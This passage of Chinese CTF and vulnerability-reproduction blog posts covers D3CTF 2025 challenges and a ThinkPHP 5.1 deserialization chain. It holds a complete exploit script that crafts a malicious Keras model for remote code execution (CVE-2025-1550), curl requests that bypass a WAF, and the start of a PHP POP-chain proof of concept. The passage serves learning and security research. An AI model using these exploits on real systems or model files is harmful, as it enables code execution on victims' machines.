SavedModel**格式文件\n\n分析完是没什么头绪，只能翻翻CVE了，翻到一个CVE-2025-1550\n\nhttps://nvd.nist.gov/vuln/detail/CVE-2025-1550\n\n![image-20250603104215808](../image/achieve/202411/D3CTF/image-20250603104215808.png)\n\n然后翻到一个文件https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models\n\n### #CVE-2025-1550复现\n\n首先我们了解一下Keras模型文件组成结构\n\n### Keras模型文件组成结构\n\nKeras 模型由多个组件组成：\n\n- **config.json**文件：架构或配置，指定模型包含哪些层以及它们如何连接。\n- **model.weights.h5**：一组权重值（“模型的状态”）。\n- **metadata.json**：包含有关模型的元数据信息\n\n这三个文件使用 ZIP 算法压缩，并保存为一个以`.keras`为扩展名的文件。\n\n### 如何保存和加载keras模型\n\n关于保存keras模型，通常会用model.save函数去进行保存\n\n```python\nmodel = ...  # Get model (Sequential, Functional Model, or Model subclass)\nmodel.save('path/to/location.keras')  # The file needs to end with the .keras extension\n```\n\n然后就是加载keras模型文件了\n\n其实上面分析代码也可以看出来，加载过程是由load_model 函数启动的，这个函数会根据文件类型和后缀名执行不同的加载路径，但是这里并不是复现的重点\n\n```python\nmodel = keras.models.load_model('path/to/location.keras')\n```\n\n我们直接关注模型加载的内部流程\n\n当我们调用加载函数时，会提取ZIP文件的内容然后重构模型，在此阶段会先检查**config.json**文件，了解模型的架构和配置，并调用`_model_from_config`函数，该函数会从config文件中重建模型实例。将 JSON 对象加载到内存后，会调用 deserialize_keras_object 函数将序列化的结构转换回对象。\n\n### 漏洞分析\n\n问题其实就是在于deserialize_keras_object反序列化函数中\n\n我们看看师傅的文章中是怎么说的\n\n当我们详细检查 deserialize_keras_object 函数时，跳过一些不重要的代码块后，我们遇到了两个值得注意的部分。第一个是：\n\n```python\n    if class_name == \"function\":\n        fn_name = inner_config\n        return _retrieve_class_or_fn(\n            fn_name,\n            registered_name,\n            module,\n            obj_type=\"function\",\n            full_config=config,\n            custom_objects=custom_objects,\n        )\n```\n\n如果`config.json`文件中的`class_name`值为“function”，则调用`_retrieve_class_or_fn`函数并执行以下代码\n\n```python\n        try:\n            mod = importlib.import_module(module)\n        except ModuleNotFoundError:\n            raise TypeError(\n                f\"Could not deserialize {obj_type} '{name}' because \"\n                f\"its parent module {module} cannot be imported. \"\n                f\"Full object config: {full_config}\"\n            )\n        obj = vars(mod).get(name, None)\n\n        # Special case for keras.metrics.metrics\n        if obj is None and registered_name is not None:\n            obj = vars(mod).get(registered_name, None)\n\n        if obj is not None:\n            return obj\n```\n\n**动态导入 Python 模块并获取对象**。这时，你可能会想到直接在 Keras 模型中添加一个 Python 文件并导入。然而，当打开 Keras 的压缩文件时，这个文件会被解压到一个临时目录中，而导入 Keras 的 Python 代码将无法导入这个临时目录中的文件。\n\n在这种情况下，我们可以使用 os.system 命令实现简单的远程代码执行 (RCE)。然而，当我检查是否可以调用此对象并控制其参数时，我发现这不太可能。\n\n当我们继续阅读代码时，这一部分很突出：\n\n```python\n    cls = _retrieve_class_or_fn(\n        class_name,\n        registered_name,\n        module,\n        obj_type=\"class\",\n        full_config=config,\n        custom_objects=custom_objects,\n    )\n\n    if isinstance(cls, types.FunctionType):\n        return cls\n    if not hasattr(cls, \"from_config\"):\n        raise TypeError(\n            f\"Unable to reconstruct an instance of '{class_name}' because \"\n            f\"the class is missing a `from_config()` method. \"\n            f\"Full object config: {config}\"\n        )\n\n    # Instantiate the class from its config inside a custom object scope\n    # so that we can catch any custom objects that the config refers to.\n    custom_obj_scope = object_registration.CustomObjectScope(custom_objects)\n    safe_mode_scope = SafeModeScope(safe_mode)\n    with custom_obj_scope, safe_mode_scope:\n        try:\n            instance = cls.from_config(inner_config)\n        except TypeError as e:\n            raise TypeError(\n                f\"{cls} could not be deserialized properly. Please\"\n                \" ensure that components that are Python object\"\n                \" instances (layers, models, etc.) returned by\"\n                \" `get_config()` are explicitly deserialized in the\"\n                \" model's `from_config()` method.\"\n                f\"\\n\\nconfig={config}.\\n\\nException encountered: {e}\"\n            )\n        build_config = config.get(\"build_config\", None)\n        if build_config and not instance.built:\n            instance.build_from_config(build_config)\n            instance.built = True\n        compile_config = config.get(\"compile_config\", None)\n        if compile_config:\n            instance.compile_from_config(compile_config)\n            instance.compiled = True\n```\n\n这里，`_retrieve_class_or_fn`函数再次被调用，现在我们可以调用方法并管理输入了。然而，尽管我进行了所有检查，却没有找到`from_config` 、`build_from_config`和`compile_from_config`方法的可利用版本；除了一个之外。\n\n当我检查`src/models/model.py`文件中Model类的`from_config`方法时，我发现调用了` functional_from_config`方法。\n\n```python\ndef functional_from_config(cls, config, custom_objects=None):\n    \"\"\"Instantiates a Functional model from its config (from `get_config()`).\n\n    Args:\n        cls: Class of the model, e.g. a custom subclass of `Model`.\n        config: Output of `get_config()` for the original model instance.\n        custom_objects: Optional dict of custom objects.\n\n    Returns:\n        An instance of `cls`.\n    \"\"\"\n    # Layer instances created during\n    # the graph reconstruction process\n    created_layers = {}\n\n    # Dictionary mapping layer instances to\n    # node data that specifies a layer call.\n    # It acts as a queue that maintains any unprocessed\n    # layer call until it becomes possible to process it\n    # (i.e. until the input tensors to the call all exist).\n    unprocessed_nodes = {}\n\n    def add_unprocessed_node(layer, node_data):\n        \"\"\"Add node to layer list\n\n        Arg:\n            layer: layer object\n            node_data: Node data specifying layer call\n        \"\"\"\n        if layer not in unprocessed_nodes:\n            unprocessed_nodes[layer] = [node_data]\n        else:\n            unprocessed_nodes[layer].append(node_data)\n\n    def process_node(layer, node_data):\n        \"\"\"Reconstruct node by linking to inbound layers\n\n        Args:\n            layer: Layer to process\n            node_data: List of layer configs\n        \"\"\"\n        args, kwargs = deserialize_node(node_data, created_layers)\n        # Call layer on its inputs, thus creating the node\n        # and building the layer if needed.\n        layer(*args, **kwargs)\n\n    def process_layer(layer_data):\n        \"\"\"Deserializes a layer and index its inbound nodes.\n\n        Args:\n            layer_data: layer config dict.\n        \"\"\"\n        layer_name = layer_data[\"name\"]\n\n        # Instantiate layer.\n        if \"module\" not in layer_data:\n            # Legacy format deserialization (no \"module\" key)\n            # used for H5 and SavedModel formats\n            layer = saving_utils.model_from_config(\n                layer_data, custom_objects=custom_objects\n            )\n        else:\n            layer = serialization_lib.deserialize_keras_object(\n                layer_data, custom_objects=custom_objects\n            )\n        created_layers[layer_name] = layer\n\n        # Gather layer inputs.\n        inbound_nodes_data = layer_data[\"inbound_nodes\"]\n        for node_data in inbound_nodes_data:\n            # We don't process nodes (i.e. make layer calls)\n            # on the fly because the inbound node may not yet exist,\n            # in case of layer shared at different topological depths\n            # (e.g. a model such as A(B(A(B(x)))))\n            add_unprocessed_node(layer, node_data)\n\n    # Extract config used to instantiate Functional model from the config. The\n    # remaining config will be passed as keyword arguments to the Model\n    # constructor.\n    functional_config = {}\n    for key in [\"layers\", \"input_layers\", \"output_layers\"]:\n        functional_config[key] = config.pop(key)\n    for key in [\"name\", \"trainable\"]:\n        if key in config:\n            functional_config[key] = config.pop(key)\n        else:\n            functional_config[key] = None\n\n    # First, we create all layers and enqueue nodes to be processed\n    for layer_data in functional_config[\"layers\"]:\n        process_layer(layer_data)\n\n    # Then we process nodes in order of layer depth.\n    # Nodes that cannot yet be processed (if the inbound node\n    # does not yet exist) are re-enqueued, and the process\n    # is repeated until all nodes are processed.\n    while unprocessed_nodes:\n        for layer_data in functional_config[\"layers\"]:\n            layer = created_layers[layer_data[\"name\"]]\n\n            # Process all nodes in layer, if not yet processed\n            if layer in unprocessed_nodes:\n                node_data_list = unprocessed_nodes[layer]\n\n                # Process nodes in order\n                node_index = 0\n                while node_index < len(node_data_list):\n                    node_data = node_data_list[node_index]\n                    try:\n                        process_node(layer, node_data)\n\n                    # If the node does not have all inbound layers\n                    # available, stop processing and continue later\n                    except IndexError:\n                        break\n\n                    node_index += 1\n\n                # If not all nodes processed then store unprocessed nodes\n                if node_index < len(node_data_list):\n                    unprocessed_nodes[layer] = node_data_list[node_index:]\n                # If all nodes processed remove the layer\n                else:\n                    del unprocessed_nodes[layer]\n\n    # Create list of input and output tensors and return new class\n    name = functional_config[\"name\"]\n    trainable = functional_config[\"trainable\"]\n```\n\n检查此方法时，我们发现`process_layer`方法使用` functional_config[\"layers\"]`输入创建一个层。然后，调用`add_unprocessed_node`函数（即将创建的层添加到`unprocessed_nodes`列表中）。之后，我们注意到此层值通过`process_node`函数调用，其参数也是我们控制的值。如果我们能够使用正确的类型调用参数且不做任何更改，就能实现我们的目标。\n\n```python\ndef deserialize_node(node_data, created_layers):\n    \"\"\"Return (args, kwargs) for calling the node layer.\"\"\"\n    if not node_data:\n        return [], {}\n\n    if isinstance(node_data, list):\n        # Legacy case.\n        # ... more code\n        return [unpack_singleton(input_tensors)], kwargs\n\n    args = serialization_lib.deserialize_keras_object(node_data[\"args\"])\n    kwargs = serialization_lib.deserialize_keras_object(node_data[\"kwargs\"])\n    def convert_revived_tensor(x):\n        if isinstance(x, backend.KerasTensor):\n            history = x._pre_serialization_keras_history\n            if history is None:\n                return x\n            layer = created_layers.get(history[0], None)\n            if layer is None:\n                raise ValueError(f\"Unknown layer: {history[0]}\")\n            inbound_node_index = history[1]\n            inbound_tensor_index = history[2]\n            if len(layer._inbound_nodes) <= inbound_node_index:\n                raise IndexError(\n                    \"Layer node index out of bounds.\\n\"\n                    f\"inbound_layer = {layer}\\n\"\n                    f\"inbound_layer._inbound_nodes = {layer._inbound_nodes}\\n\"\n                    f\"inbound_node_index = {inbound_node_index}\"\n                )\n            inbound_node = layer._inbound_nodes[inbound_node_index]\n            return inbound_node.output_tensors[inbound_tensor_index]\n        return x\n\n    args = tree.map_structure(convert_revived_tensor, args)\n    kwargs = tree.map_structure(convert_revived_tensor, kwargs)\n    return args, kwargs\n```\n\n`deserialize_node`用于转换配置数据中的 inbound_nodes 值，并使用`deserialize_keras_object`执行反序列化操作。但是，目前我们不需要这些操作，因此当我们提供纯文本时，我们会直接返回原值，无需进行类型转换。\n\n### 漏洞利用\n\n直接用exp打就行了\n\n```json\nimport os\nimport zipfile\nimport json\nfrom keras.models import Sequential\nfrom keras.layers import Dense\nimport numpy as np\n\nmodel_name = \"model.keras\"\n\nx_train = np.random.rand(100, 28 * 28)\ny_train = np.random.rand(100)\n\nmodel = Sequential([Dense(1, activation='linear', input_dim=28 * 28)])\n\nmodel.compile(optimizer='adam', loss='mse')\nmodel.fit(x_train, y_train, epochs=5)\nmodel.save(model_name)\n\nwith zipfile.ZipFile(model_name, \"r\") as f:\n    config = json.loads(f.read(\"config.json\").decode())\n\nconfig[\"config\"][\"layers\"][0][\"module\"] = \"keras.models\"\nconfig[\"config\"][\"layers\"][0][\"class_name\"] = \"Model\"\nconfig[\"config\"][\"layers\"][0][\"config\"] = {\n    \"name\": \"test\",\n    \"layers\": [\n        {\n            \"name\": \"layer_name\",\n            \"class_name\": \"popen\",\n            \"config\": \"config\",\n            \"module\": \"os\",\n            \"inbound_nodes\": [\n                {\n                    \"args\" : [\n                        \"whoami > /tmp/1.txt\"\n                    ]\n                }\n            ]\n        }\n    ],\n    \"input_layers\": \"\",\n    \"output_layers\": \"\"\n}\n\nwith zipfile.ZipFile(model_name, 'r') as zip_read:\n    with zipfile.ZipFile(f\"tmp.{model_name}\", 'w') as zip_write:\n        for item in zip_read.infolist():\n            if item.filename != \"config.json\":\n                zip_write.writestr(item, zip_read.read(item.filename))\n\nos.remove(model_name)\nos.rename(f\"tmp.{model_name}\", model_name)\n\nwith zipfile.ZipFile(model_name, \"a\") as zf:\n    zf.writestr(\"config.json\", json.dumps(config))\n\nprint(\"[+] Malicious model ready\")\n```\n\n把config.json的内容改成恶意RCE就行了\n\n## tidy quic\n\n一个简单的基于 quic-go 的 HTTP3 服务器\n\n```go\npackage main\n\nimport (\n\t\"bytes\"\n\t\"errors\"\n\t\"github.com/libp2p/go-buffer-pool\"\n\t\"github.com/quic-go/quic-go/http3\"\n\t\"io\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n)\n\nvar p pool.BufferPool\nvar ErrWAF = errors.New(\"WAF\")\n\nfunc main() {\n\tgo func() {\n\t\terr := http.ListenAndServeTLS(\":8080\", \"./server.crt\", \"./server.key\", &mux{})\n\t\tlog.Fatalln(err)\n\t}()\n\tgo func() {\n\t\terr := http3.ListenAndServeQUIC(\":8080\", \"./server.crt\", \"./server.key\", &mux{})\n\t\tlog.Fatalln(err)\n\t}()\n\tselect {}\n}\n\ntype mux struct {\n}\n\nfunc (*mux) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n\tif r.Method == http.MethodGet {\n\t\t_, _ = w.Write([]byte(\"Hello D^3CTF 2025,I'm tidy quic in web.\"))\n\t\treturn\n\t}\n\tif r.Method != http.MethodPost {\n\t\tw.WriteHeader(400)\n\t\treturn\n\t}\n\n\tvar buf []byte\n\tlength := int(r.ContentLength)\n\tif length == -1 {\n\t\tvar err error\n\t\tbuf, err = io.ReadAll(textInterrupterWrap(r.Body))\n\t\tif err != nil {\n\t\t\tif errors.Is(err, ErrWAF) {\n\t\t\t\tw.WriteHeader(400)\n\t\t\t\t_, _ = w.Write([]byte(\"WAF\"))\n\t\t\t} else {\n\t\t\t\tw.WriteHeader(500)\n\t\t\t\t_, _ = w.Write([]byte(\"error\"))\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t} else {\n\t\tbuf = p.Get(length)\n\t\tdefer p.Put(buf)\n\t\trd := textInterrupterWrap(r.Body)\n\t\ti := 0\n\t\tfor {\n\t\t\tn, err := rd.Read(buf[i:])\n\t\t\tif err != nil {\n\t\t\t\tif errors.Is(err, io.EOF) {\n\t\t\t\t\tbreak\n\t\t\t\t} else if errors.Is(err, ErrWAF) {\n\t\t\t\t\tw.WriteHeader(400)\n\t\t\t\t\t_, _ = w.Write([]byte(\"WAF\"))\n\t\t\t\t\treturn\n\t\t\t\t} else {\n\t\t\t\t\tw.WriteHeader(500)\n\t\t\t\t\t_, _ = w.Write([]byte(\"error\"))\n\t\t\t\t\treturn\n\t\t\t\t}\n\t\t\t}\n\t\t\ti += n\n\t\t}\n\t}\n\tif !bytes.HasPrefix(buf, []byte(\"I want\")) {\n\t\t_, _ = w.Write([]byte(\"Sorry I'm not clear what you want.\"))\n\t\treturn\n\t}\n\titem := bytes.TrimSpace(bytes.TrimPrefix(buf, []byte(\"I want\")))\n\tif bytes.Equal(item, []byte(\"flag\")) {\n\t\t_, _ = w.Write([]byte(os.Getenv(\"FLAG\")))\n\t} else {\n\t\t_, _ = w.Write(item)\n\t}\n}\n\ntype wrap struct {\n\tio.ReadCloser\n\tban []byte\n\tidx int\n}\n\nfunc (w *wrap) Read(p []byte) (int, error) {\n\tn, err := w.ReadCloser.Read(p)\n\tif err != nil && !errors.Is(err, io.EOF) {\n\t\treturn n, err\n\t}\n\tfor i := 0; i < n; i++ {\n\t\tif p[i] == w.ban[w.idx] {\n\t\t\tw.idx++\n\t\t\tif w.idx == len(w.ban) {\n\t\t\t\treturn n, ErrWAF\n\t\t\t}\n\t\t} else {\n\t\t\tw.idx = 0\n\t\t}\n\t}\n\treturn n, err\n}\n\nfunc textInterrupterWrap(rc io.ReadCloser) io.ReadCloser {\n\treturn &wrap{\n\t\trc, []byte(\"flag\"), 0,\n\t}\n}\n```\n\n前面的是关于请求的处理，不重要，主要看后面的请求处理检查的逻辑\n\n```go\nif !bytes.HasPrefix(buf, []byte(\"I want\")) {\n    _, _ = w.Write([]byte(\"Sorry I'm not clear what you want.\"))\n    return\n}\nitem := bytes.TrimSpace(bytes.TrimPrefix(buf, []byte(\"I want\")))\nif bytes.Equal(item, []byte(\"flag\")) {\n    _, _ = w.Write([]byte(os.Getenv(\"FLAG\"))) // 返回 FLAG 环境变量\n} else {\n    _, _ = w.Write(item) // 原样返回\n}\n```\n\n这里要求请求体必须以`I want`开头，如果请求`I want flag`，则返回flag的内容，否则就原样返回\n\n但是这里有waf\n\n```go\nfunc textInterrupterWrap(rc io.ReadCloser) io.ReadCloser {\n\treturn &wrap{\n\t\trc, []byte(\"flag\"), 0,\n\t}\n```\n\n对 `r.Body` 进行包装，检测是否包含 `\"flag\"` 字符串。\n\n```go\ntype wrap struct {\n    io.ReadCloser\n    ban []byte // 要检测的字符串（\"flag\"）\n    idx int    // 当前匹配位置\n}\n\nfunc (w *wrap) Read(p []byte) (int, error) {\n    n, err := w.ReadCloser.Read(p)\n    if err != nil && !errors.Is(err, io.EOF) {\n        return n, err\n    }\n    for i := 0; i < n; i++ {\n        if p[i] == w.ban[w.idx] { // 匹配到 \"flag\" 的一个字符\n            w.idx++\n            if w.idx == len(w.ban) { // 完全匹配 \"flag\"\n                return n, ErrWAF // 触发 WAF\n            }\n        } else {\n            w.idx = 0 // 重置匹配\n        }\n    }\n    return n, err\n}\n\n```\n\n这里的话会收集flag中的每个字符，如果完全符合flag就会触发WAF，所以双写绕过是不行的\n\n但是分析后可以发现，这里读取的 Body 长度取决于ContentLength 字段而非实际长度，然后在for循环中可以看到n其实就是读取到的数据的长度，假如我们自己设置该请求头ContentLength，是否让waf只读取部分内容呢？那我们是否可以利用这个误差打一个绕过？\n\n因为我的curl不支持http3，所以得重新搞一个\n\n先测试连接\n\n```\nC:\\Users\\23232\\Desktop>curl -X GET https://35.241.98.126:30413/ --http3 -i --insecure\nHTTP/3 200\ncontent-type: text/plain; charset=utf-8\ndate: Tue, 03 Jun 2025 06:09:03 GMT\ncontent-length: 39\n\nHello D^3CTF 2025,I'm tidy quic in web.\n```\n\n发现能成功连接\n\n```\nC:\\Users\\23232\\Desktop>curl -X POST https://35.241.98.126:30413/ --http3 -d \"I want flag\" -H \"Content-Length: 11\" -i --insecure\nHTTP/3 400\ndate: Tue, 03 Jun 2025 06:11:59 GMT\ncontent-length: 3\ncontent-type: text/plain; charset=utf-8\n\nWAF\n```\n\n正常传入的话会触发waf\n\n```\nx=$'I want \\0flag'\ncurl -X POST https://35.241.98.126:30413/ --http3 -d \"$x\" -H \"Content-Length: 11\" -i --insecure\n```\n\n不知道为什么设置的环境变量一直穿不进去，但是包那边是打通了的\n\n只会做这两个，其他的太难了。。。\n\n\n\n\n\n\n\n","tags":["D3CTF 2025"],"categories":["赛题wp"]},{"title":"PHP反序列化-TP5.1.x框架","url":"/2025/06/02/PHP反序列化-TP5框架/","content":"\n一个老版本的tp框架的反序列化漏洞\n\n## 0x01环境搭建\n\n- PHP7.3+Xdebug+thinkphp5.1.37+PHPSTORM\n\n直接用composer搭建\n\n```\ncomposer create-project --prefer-dist topthink/think=5.1.37 thinkphp5.1.37\n```\n\n运行环境\n\n```\nphp think run\n```\n\n![image-20250602170103037](../image/achieve/202411/CVE复现/image-20250602170103037.png)\n\n出来了\n\n因为是二次触发不是原生触发的，所以需要写个反序列化的入口\n\n在app\\index\\controller目录下新建一个控制器Test.php\n\n```php\n<?php\nnamespace app\\index\\controller;\n\nclass Test{\n    public function unserialize($poc=\"\"){\n        echo \"Welcome to unserialization:<br>\";\n        echo \"You's input :\".$poc.\"<br>\";\n        echo unserialize(base64_decode($poc));\n    }\n}\n```\n\n然后在route.php中添加路由\n\n```php\nRoute::get('/test', 'Test/unserialize');\n```\n\n随后访问test路由\n\n![image-20250603144537882](../image/achieve/202411/CVE复现/image-20250603144537882.png)\n\n搭建完成\n\n## 0x02漏洞复现\n\n全局搜索一下常规的反序列化入口`__destruct()`方法\n\n![image-20250603144654580](../image/achieve/202411/CVE复现/image-20250603144654580.png)\n\n先看看第二个吧Process.php\n\n```php\n    public function __destruct()\n    {\n        $this->stop();\n    }\n```\n\n这里调用了一个stop函数，跟进看看\n\n```php\n    public function stop()\n    {\n        if ($this->isRunning()) {\n            if ('\\\\' === DIRECTORY_SEPARATOR && !$this->isSigchildEnabled()) {\n                exec(sprintf('taskkill /F /T /PID %d 2>&1', $this->getPid()), $output, $exitCode);\n                if ($exitCode > 0) {\n                    throw new \\RuntimeException('Unable to kill the process');\n                }\n            } else {\n                $pids = preg_split('/\\s+/', `ps -o pid --no-heading --ppid {$this->getPid()}`);\n                foreach ($pids as $pid) {\n                    if (is_numeric($pid)) {\n                        posix_kill($pid, 9);\n                    }\n                }\n            }\n        }\n\n        $this->updateStatus(false);\n        if ($this->processInformation['running']) {\n            $this->close();\n        }\n\n        return $this->exitcode;\n    }\n```\n\n这里是一个终止进程的代码，如果有一个正在运行的进程，就根据Windows和unix系统的不同处理方式去获取子进程的PID并强制终止进程，最后返回退出代码\n\n我们跟进isRunning函数看看\n\n```php\n    public function isRunning()\n    {\n        if (self::STATUS_STARTED !== $this->status) {\n            return false;\n        }\n\n        $this->updateStatus(false);\n\n        return $this->processInformation['running'];\n    }\n```\n\n这里的话就检查进程状态，如果进程未开启则返回false，也就不会执行if语句\n\n```php\n    protected function updateStatus($blocking)\n{\n        if (self::STATUS_STARTED !== $this->status) {\n            return;\n        }\n\n        $this->processInformation = proc_get_status($this->process);\n        $this->captureExitCode();\n\n        $this->readPipes($blocking, '\\\\' === DIRECTORY_SEPARATOR ? !$this->processInformation['running'] : true);\n\n        if (!$this->processInformation['running']) {\n            $this->close();\n        }\n    }\n```\n\n这个函数用于更新进程的状态，并赋值给processInformation表示进程状态，这里看完感觉没什么可利用的点，我们看看其他的类\n\n看看think\\process\\pipes的Windows.php\n\n```php\n    public function __destruct()\n    {\n        $this->close();\n        $this->removeFiles();\n    }\n```\n\n先看看close函数\n\n```php\npublic function close()\n    {\n        parent::close();\n        foreach ($this->fileHandles as $handle) {\n            fclose($handle);\n        }\n        $this->fileHandles = [];\n    }\n```\n\n这里的话会调用父类的close方法，跟进看看\n\n```php\n    public function close()\n    {\n        foreach ($this->pipes as $pipe) {\n            fclose($pipe);\n        }\n        $this->pipes = [];\n    }\n```\n\n这里的话会关闭当前对象管理的管道资源，令管道资源数组为空\n\n回到子类的close，新增了一个清理文件句柄的操作，这里貌似没有什么可用的地方，我们看看另一个函数removeFiles()\n\n```php\n    private function removeFiles()\n    {\n        foreach ($this->files as $filename) {\n            if (file_exists($filename)) {\n                @unlink($filename);\n            }\n        }\n        $this->files = [];\n    }\n```\n\n这里检测文件是否存在，存在则执行unlink函数删除文件，一开始看到这个函数下意识想到phar反序列化的打法，但是这里只是一个单纯的反序列化，并且没有文件上传或者写文件的入口，估计这个能被利用来出题\n\n那这里还能干嘛呢？在if语句里面利用`file_exists($filename)`的时候会把filename当成参数字符串去处理，那我们找找`__toString()`方法？\n\n全局搜索`__toString()`方法，找到一个`think\\model\\concern\\Conversion.php`的`__toString()`\n\n```php\n    public function __toString()\n    {\n        return $this->toJson();\n    }\n```\n\n```php\n    public function toJson($options = JSON_UNESCAPED_UNICODE)\n    {\n        return json_encode($this->toArray(), $options);\n    }\n```\n\n跟进之后发现这里就是一个单纯的json字符串的解析返回，这里采用的是JSON_UNESCAPED_UNICODE，以字面编码多字节 Unicode 字符。跟进toArray函数\n\n```php\n    public function toArray()\n    {\n        $item       = [];\n        $hasVisible = false;\n\n        foreach ($this->visible as $key => $val) {\n            if (is_string($val)) {\n                if (strpos($val, '.')) {\n                    list($relation, $name)      = explode('.', $val);\n                    $this->visible[$relation][] = $name;\n                } else {\n                    $this->visible[$val] = true;\n                    $hasVisible          = true;\n                }\n                unset($this->visible[$key]);\n            }\n        }\n\n        foreach ($this->hidden as $key => $val) {\n            if (is_string($val)) {\n                if (strpos($val, '.')) {\n                    list($relation, $name)     = explode('.', $val);\n                    $this->hidden[$relation][] = $name;\n                } else {\n                    $this->hidden[$val] = true;\n                }\n                unset($this->hidden[$key]);\n            }\n        }\n\n        // 合并关联数据\n        $data = array_merge($this->data, $this->relation);\n\n        foreach ($data as $key => $val) {\n            if ($val instanceof Model || $val instanceof ModelCollection) {\n                // 关联模型对象\n                if (isset($this->visible[$key]) && is_array($this->visible[$key])) {\n                    $val->visible($this->visible[$key]);\n                } elseif (isset($this->hidden[$key]) && is_array($this->hidden[$key])) {\n                    $val->hidden($this->hidden[$key]);\n                }\n                // 关联模型对象\n                if (!isset($this->hidden[$key]) || true !== $this->hidden[$key]) {\n                    $item[$key] = $val->toArray();\n                }\n            } elseif (isset($this->visible[$key])) {\n                $item[$key] = $this->getAttr($key);\n            } elseif (!isset($this->hidden[$key]) && !$hasVisible) {\n                $item[$key] = $this->getAttr($key);\n            }\n        }\n\n        // 追加属性（必须定义获取器）\n        if (!empty($this->append)) {\n            foreach ($this->append as $key => $name) {\n                if (is_array($name)) {\n                    // 追加关联对象属性\n                    $relation = $this->getRelation($key);\n\n                    if (!$relation) {\n                        $relation = $this->getAttr($key);\n                        if ($relation) {\n                            $relation->visible($name);\n                        }\n                    }\n\n                    $item[$key] = $relation ? $relation->append($name)->toArray() : [];\n                } elseif (strpos($name, '.')) {\n                    list($key, $attr) = explode('.', $name);\n                    // 追加关联对象属性\n                    $relation = $this->getRelation($key);\n\n                    if (!$relation) {\n                        $relation = $this->getAttr($key);\n                        if ($relation) {\n                            $relation->visible([$attr]);\n                        }\n                    }\n\n                    $item[$key] = $relation ? $relation->append([$attr])->toArray() : [];\n                } else {\n                    $item[$name] = $this->getAttr($name, $item);\n                }\n            }\n        }\n\n        return $item;\n    }\n```\n\n看一下具体逻辑\n\n对于visible数组来说，该数组是用于存储显示的属性的字符串\n\n```php\nforeach ($this->visible as $key => $val) {\n            if (is_string($val)) {\n                if (strpos($val, '.')) {\n                    list($relation, $name)      = explode('.', $val);\n                    $this->visible[$relation][] = $name;\n                } else {\n                    $this->visible[$val] = true;\n                    $hasVisible          = true;\n                }\n                unset($this->visible[$key]);\n            }\n        }\n```\n\n这里的话处理值为字符串的字段\n\n- 处理关联字段（含`.`的字符串）：例如`user.name`处理后是`['user' => ['name']]`\n- 处理简单字段：例如`id`处理后是`['id' => true]`\n\n处理好后清理原有的值\n\n对于hidden数组来说，该数组是用于存储需要隐藏的属性字符串的\n\n```php\n        foreach ($this->hidden as $key => $val) {\n            if (is_string($val)) {\n                if (strpos($val, '.')) {\n                    list($relation, $name)     = explode('.', $val);\n                    $this->hidden[$relation][] = $name;\n                } else {\n                    $this->hidden[$val] = true;\n                }\n                unset($this->hidden[$key]);\n            }\n        }\n```\n\n处理逻辑是一样的\n\n```php\n$data = array_merge($this->data, $this->relation);\n\n        foreach ($data as $key => $val) {\n            if ($val instanceof Model || $val instanceof ModelCollection) {\n                // 关联模型对象\n                if (isset($this->visible[$key]) && is_array($this->visible[$key])) {\n                    $val->visible($this->visible[$key]);\n                } elseif (isset($this->hidden[$key]) && is_array($this->hidden[$key])) {\n                    $val->hidden($this->hidden[$key]);\n                }\n                // 关联模型对象\n                if (!isset($this->hidden[$key]) || true !== $this->hidden[$key]) {\n                    $item[$key] = $val->toArray();\n                }\n            } elseif (isset($this->visible[$key])) {\n                $item[$key] = $this->getAttr($key);\n            } elseif (!isset($this->hidden[$key]) && !$hasVisible) {\n                $item[$key] = $this->getAttr($key);\n            }\n        }\n```\n\n这里的话就是利用前面的规则去处理关联模型对象\n\n其实上面的都是一些基础的操作，我们真正利用的是最后的追加属性的操作\n\n![image-20250603154253978](../image/achieve/202411/CVE复现/image-20250603154253978.png)\n\n我这里发现visible方法并没有声明，那就意味着这里可能会触发`__call()`方法，那当$relation可控的时候也就意味着key和name可控\n\n因为Conversion是trait关键字声明的无法被实例化，那我们找找继承了该类的子类\n\n![image-20250603153703591](../image/achieve/202411/CVE复现/image-20250603153703591.png)\n\n可以看到Model类在它的内部复用了被`trait`修饰的`Conversion`对象\n\n然后恰好在该类中找到一个`__call()`方法\n\n![image-20250603154433522](../image/achieve/202411/CVE复现/image-20250603154433522.png)\n\n但是这个方法中的调用函数的方法限制的很死，一会找找别的`__call()`方法\n\n但是Model类是抽象类也不能被实例化，找找他的子类\n\n全局搜索extends Model，表示继承Model类的子类，只找到一个Pivot类，所以只能是这个类了\n\n因为Pivot类继承了Model抽象类，然而Model抽象类复用了被`trait`修饰的`Conversion`对象，所以可以通过Pivot类调用被`trait`修饰的`Conversion`对象的`__toSrting()方法`\n\n不过在进入该if语句的时候还会执行第188行代码，也就是getRelation函数，我们跟进看一下\n\n![image-20250603154649705](../image/achieve/202411/CVE复现/image-20250603154649705.png)\n\n为了更好的理解，我们构造一个test传进去试一下\n\n```php\n<?php\nnamespace think\\process\\pipes{\n    use think\\model\\Pivot;\n    class Windows{\n        private $files = [];\n        public function __construct(){\n            $this -> files = [new Pivot()];\n        }\n    }\n}\nnamespace think{\n    abstract class Model{\n        protected $append = [];\n        public function __construct(){\n            $this -> append = ['test'=>['1','2']];\n        }\n    }\n}\nnamespace think\\model{\n    use think\\Model;\n    class Pivot extends Model{\n    }\n}\nnamespace{\n    use think\\process\\pipes\\Windows;\n    echo base64_encode(serialize(new 